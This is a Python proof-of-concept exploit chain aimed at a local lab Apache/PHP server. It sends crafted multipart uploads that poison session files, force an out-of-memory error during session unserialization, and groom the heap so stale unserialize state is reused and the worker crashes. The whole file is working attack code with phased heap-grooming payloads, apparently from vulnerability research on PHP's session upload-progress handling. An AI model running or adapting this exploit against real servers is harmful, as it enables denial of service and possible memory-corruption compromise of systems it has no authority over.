#!/usr/bin/env python3
"""8083 FULL CHAIN (poc candidate): keep-alive single connection (one Apache child).
P0: poison SID H: key + file(420KB name) => first update writes sess_H (~420KB),
    FILE_END update OOMs AFTER the write => entry persists.
P1: decode-OOM producer: SID H + 32x40KB groom fields + key + tiny file =>
    FILE_START update => initialize => decode 420K on ~1.28M groom =>
    OOM inside php_var_unserialize => BG(unserialize) stale on THIS worker.
P2: poison SID Z (fresh): same shape as P0 => sess_Z ~420KB persists.
    (Z file absent during P2's own decode => P2 does NOT consume the stale d_u.)
P3: consumer: 30x193B groom fields (224-bin strings = d_u bin) + SID Z + key +
    tiny file => initialize => decode sess_Z (arrays) => UNSER_INIT reuses stale
    d_u => tmp_var reads used_slots via last_dtor(=193=0xC1) => SEGV marker.
Observers: response bodies, worker bias before/after."""
import socket, sys, re, time

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"
SID_H = b"aabbccddeeff00112233445566778899"
SID_Z = b"99887766554433221100ffeeddccbbaa"

def part(name, body, filename=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def pb(parts): return b"".join(parts) + b"--" + B + b"--\r\n"

def post_head(blen):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\nConnection: keep-alive\r\n\r\n").encode()

class KA:
    def __init__(self): self.s = socket.create_connection((HOST, PORT), timeout=30)
    def send(self, head, body=None, timeout=120):
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)): return buf
            try: d = self.s.recv(65536)
            except socket.timeout: return buf + b"\n<TIMEOUT>"
            except ConnectionResetError: return buf + b"\n<RESET>"
            if not d: return buf + b"\n<EOF>"
            buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

def bias():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        s.settimeout(20)
        out = b""
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
        s.close()
        return out.split(b"\r\n\r\n", 1)[1].strip()
    except Exception as e:
        return f"ERR:{type(e).__name__}".encode()

def stat(r):
    mm = re.search(rb"tried to allocate (\d+)", r)
    alloc = mm.group(1).decode() if mm else "-"
    return f"rawlen={len(r)} fatal={b'Allowed memory' in r} alloc={alloc} body={r[r.find(b'lab ok'):] [:30] if b'lab ok' in r else r[:60]!r}"

b0 = bias()
print(f"bias BEFORE: {b0!r}", flush=True)

ka = KA()
def fire(tag, parts, timeout=120):
    body = pb(parts)
    r = ka.send(post_head(len(body)), body, timeout=timeout)
    print(f"[{tag}] {stat(r)}", flush=True)
    return r

# P0: poison H
fire("P0 poison H", [part(b"PHPSESSID", SID_H),
                     part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyA"),
                     part(b"u", b"x" * 100, filename=b"G" * (420 * 1024))], timeout=150)

# P1: decode-OOM producer (groom pressure + tiny file)
p1 = [part(b"PHPSESSID", SID_H)]
for i in range(32):
    p1.append(part(f"g{i}".encode(), b"M" * (40 * 1024)))
p1.append(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyB"))
p1.append(part(b"u", b"y", filename=b"t.txt"))
fire("P1 decode-OOM", p1, timeout=150)

# P2: poison Z (fresh sid; its own session empty => no decode => stale d_u survives)
fire("P2 poison Z", [part(b"PHPSESSID", SID_Z),
                     part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyZ"),
                     part(b"u", b"x" * 100, filename=b"H" * (420 * 1024))], timeout=150)

# P3: consumer groom on Z
p3 = []
for i in range(30):
    p3.append(part(f"s{i}".encode(), (b"U%02d" % i).ljust(193, b"Q")))
p3.append(part(b"PHPSESSID", SID_Z))
p3.append(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyC"))
p3.append(part(b"u", b"y", filename=b"a.txt"))
r = fire("P3 consumer groom", p3, timeout=150)
ka.close()

b1 = bias()
print(f"bias AFTER:  {b1!r}", flush=True)
print(f"SAME_WORKER={b0 == b1}", flush=True)
